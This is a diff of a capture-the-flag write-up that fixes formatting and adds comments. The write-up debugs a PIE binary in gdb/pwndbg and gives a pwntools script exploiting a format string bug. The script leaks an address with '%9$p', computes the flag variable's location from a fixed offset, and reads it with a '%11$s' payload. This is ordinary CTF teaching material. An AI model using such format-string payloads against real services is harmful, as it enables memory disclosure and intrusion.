@@ -11,11 +11,11 @@ We can see that **PIE** is enabled. So for every instance of the program the add
 In order to retrieve the flag, we need to leak an address who will be always at the same distance of the `flag` variable.  
 
 We can do it locally with `gbd/pwndbg`  
-First we need to find where to set a `breakpoint`to our program so we can analyse it when it stops
+First we need to find where to set a `breakpoint` to our program so we can analyse it when it stops.  
 
 ![](./img/17.png)
 
-In the gdb/pwndbg interface we run `disass main` to see the assembly code of the binary. We can see that the `greet`function is called at `main+116`  
+In the `gdb/pwndbg` interface we run `disass main` to see the assembly code of the binary. We can see that the `greet` function is called at `main+116`  
 
 Now let's `disass greet`
 
@@ -84,29 +84,26 @@ conn = remote(HOST, PORT)
 
 # Send after we encounter "? " "%9$p"
 conn.sendlineafter(b"? ",f"%9$p".encode())
-
 # Get the result
 out = conn.recvline() 
 
 # Extract the leaked address
 leak_addr = leak_hex_int(out)[0]
-
 # Display the leaked address
 log.info(f"leak_addr = {hex(leak_addr)}")
 
 # Offset difference we calculate earlier
 offset_to_flag_var = 0x2ca1
-
 # flag_var calculation
 flag_var_addr = leak_addr + offset_to_flag_var
-
 # Display the flag var
 log.info(f"flag_var_addr = {hex(flag_var_addr)}")
 
 # Payload construction
 payload = b"%11$s" + b"ABC" + p64(flag_var_addr)  
-
+# Send the paylaod
 conn.sendlineafter(b"? ",payload)
+# Switch to interactive
 conn.interactive()
 ``` 
 
